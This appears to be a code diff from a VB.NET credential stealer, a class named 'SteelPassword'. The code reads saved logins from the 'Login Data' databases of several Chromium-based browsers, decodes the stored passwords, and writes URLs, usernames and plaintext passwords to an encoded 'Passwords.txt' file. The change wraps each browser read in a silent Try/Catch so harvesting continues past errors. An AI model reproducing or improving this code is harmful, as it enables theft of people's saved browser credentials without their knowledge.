@@ -25,25 +25,29 @@ Public Class SteelPassword
                                 "Nichrome\\User Data\Default\Login Data",
                                 "BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
             For Each ChromiumPath As String In ChromiumPaths
-                Dim loginPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
-                Dim sb As New StringBuilder
-                Dim sqlDataBase As New SqLiteHandler(loginPath)
-                sqlDataBase.ReadTable("logins")
-                Dim count As Integer = sqlDataBase.GetRowCount()
-                For i = 0 To count - 1
-                    Dim mUrl As String = sqlDataBase.GetValue(i, "origin_url")
-                    Dim mUserName As String = sqlDataBase.GetValue(i, "username_value")
-                    Dim mPassword As String = Decode(sqlDataBase.GetValue(i, "password_value"))
-                    If (mUserName = "" Or mPassword = "") Then
+                Try
+                    Dim loginPath As String = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ChromiumPath)
+                    Dim sb As New StringBuilder
+                    Dim sqlDataBase As New SqLiteHandler(loginPath)
+                    sqlDataBase.ReadTable("logins")
+                    Dim count As Integer = sqlDataBase.GetRowCount()
+                    For i = 0 To count - 1
+                        Dim mUrl As String = sqlDataBase.GetValue(i, "origin_url")
+                        Dim mUserName As String = sqlDataBase.GetValue(i, "username_value")
+                        Dim mPassword As String = Decode(sqlDataBase.GetValue(i, "password_value"))
+                        If (mUserName = "" Or mPassword = "") Then
 
-                    Else
-                        TextBox1.AppendText(mUrl & "," & mUserName & "," & mPassword & vbNewLine)
-                    End If
-                Next i
-                If Not (Data = "") Then
-                    TextBox1.AppendText(ENB(Data))
-                End If
+                        Else
+                            TextBox1.AppendText(mUrl & "," & mUserName & "," & mPassword & vbNewLine)
+                        End If
+                    Next i
+                Catch ex As Exception
+
+                End Try
             Next
+            If Not (Data = "") Then
+                TextBox1.AppendText(ENB(Data))
+            End If
             IO.File.WriteAllText(Paths & "Passwords.txt", ENB(TextBox1.Text))
             Return True
         Catch ex As Exception
